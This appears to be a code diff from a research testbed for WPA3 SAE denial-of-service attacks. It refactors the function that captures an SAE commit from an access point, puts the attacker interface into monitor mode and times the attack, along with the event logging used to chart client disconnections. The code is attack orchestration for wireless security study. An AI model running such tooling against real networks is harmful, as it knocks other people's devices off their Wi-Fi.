@@ -87,13 +87,14 @@ void run_attack(RunStatus &rs){
 	const ActorPtr ap = rs.get_actor("access_point");
 	const ActorPtr attacker = rs.get_actor("attacker");
 
-	const optional<dos_helpers::SAEPair> sae_params = get_commit_values(rs, attacker["iface"], attacker["sniff_iface"],
-																		rs.get_actor("access_point")->get(SK::ssid), ap["mac"], 30);
+	const auto &att_cfg = rs.config.at("attack_config");
+	const optional<dos_helpers::SAEPair> sae_params = get_commit_values(
+		rs, attacker["iface"], attacker["sniff_iface"],rs.get_actor("access_point")->get(SK::ssid), ap["mac"], 30);
+
 	if(sae_params.has_value()){
 		rs.start_observers();
 		log(LogLevel::INFO, "SAE Commit captured");
 		const HWAddress<6> ap_mac(ap["mac"]);
-		const auto &att_cfg = rs.config.at("attack_config");
 		const int duration = att_cfg.at("attack_time_sec").get<int>();
 		// change to monitor mode
 		attacker->set_monitor_mode();
@@ -102,18 +103,19 @@ void run_attack(RunStatus &rs){
 	} else{
 		throw runtime_error("SAE Commit capture failed");
 	}
-	this_thread::sleep_for(seconds(30)); //TODO attack time
+	const int regeneration_time_sec = att_cfg.at("regeneration_time_sec").get<int>();
+	this_thread::sleep_for(seconds(regeneration_time_sec));
 	ap->conn->disconnect();
 }
 
 void stats_attack(const RunStatus &rs){
 	vector<unique_ptr<GraphElements>> elements;
 	rs.log_events(elements, {
-					{"access_point", "did not acknowledge", "ACK_fail", "red"},
-					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
-					{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
-					{"client", "@START", "START", "black"}, {"client", "@END", "END", "black"},
-				});
+		{"access_point", "did not acknowledge", "ACK_fail", "red"},
+		{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
+		{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
+		{"client", "@START", "START", "black"}, {"client", "@END", "END", "black"},
+	});
 
 	//const string STA_graph_path = observer::tshark_graph(rs, "client", events);
 	//const string AP_graph_path =
